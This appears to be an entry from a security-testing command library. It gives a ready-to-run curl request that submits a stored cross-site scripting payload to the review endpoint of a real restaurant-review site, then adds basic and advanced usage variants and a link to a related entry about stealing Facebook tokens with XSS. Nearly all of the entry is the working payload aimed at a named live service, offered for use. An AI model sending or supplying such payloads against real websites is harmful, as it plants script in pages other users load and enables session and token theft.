---
id: cmd-632017-01
data: >-
  curl -X POST https://www.zomato.com/php/submitReview -d "review=140 characters
  long review" -d "review_db=140 characters long review" -d
  "with_tags_data=<script>prompt(0,document.domain)</script>" -d
  "res_id=19132208" -d "city_id=11333" -d "rating=5" -d "is_edit=0" -d
  "review_id=0" -d "save_image=1" -d "instagram_images_to_update=[]" -d
  "instagram_json_data={\"data\":[]}" -d "uploaded_images_json=[]" -d
  "share_to_fb=false" -d "share_to_tw=false" -d "snippet=restaurant-review" -d
  "web_source=default" -d "csrf_token=2acad4ba08d4000000000007923a25d" -d
  "external_url="
tags:
  - xss
  - http-post
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:49.940Z'
verified: false
validated: true
submitted: true
---
# submit-review-xss

## Command

```bash
curl -X POST https://www.zomato.com/php/submitReview \
  -d "review=140 characters long review" \
  -d "review_db=140 characters long review" \
  -d "with_tags_data=<script>prompt(0,document.domain)</script>" \
  -d "res_id=19132208" \
  -d "city_id=11333" \
  -d "rating=5" \
  -d "is_edit=0" \
  -d "review_id=0" \
  -d "save_image=1" \
  -d "instagram_images_to_update=[]" \
  -d "instagram_json_data={\"data\":[]}" \
  -d "uploaded_images_json=[]" \
  -d "share_to_fb=false" \
  -d "share_to_tw=false" \
  -d "snippet=restaurant-review" \
  -d "web_source=default" \
  -d "csrf_token=2acad4ba08d4000000000007923a25d" \
  -d "external_url="
```

## Description

Submits a review with an XSS payload in 'with_tags_data' to exploit stored XSS. Use for testing self-stored XSS in review systems.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d "with_tags_data=..."` | XSS payload string | Yes |
| `-d "res_id=..."` | Restaurant ID | Yes |
| `-d "city_id=..."` | City ID | Yes |
| `-d "csrf_token=..."` | Session CSRF token | Yes |
| `-d "review=..."` | Review text (up to 140 chars) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://www.zomato.com/php/submitReview -d "with_tags_data=<script>alert(1)</script>" -d "res_id=123" -d "csrf_token=abc"
```

### Advanced Usage

```bash
# With full params as above
curl -X POST https://www.zomato.com/php/submitReview [full data]
```

## Expected Output

HTTP 200 with JSON response like {"status":"success","review_id":123}; no immediate JS execution.

## Related

- [[commands/xss-payload-fb-token-steal]]
- [[procedures/Submit-Review-with-Stored-XSS-Payload]]
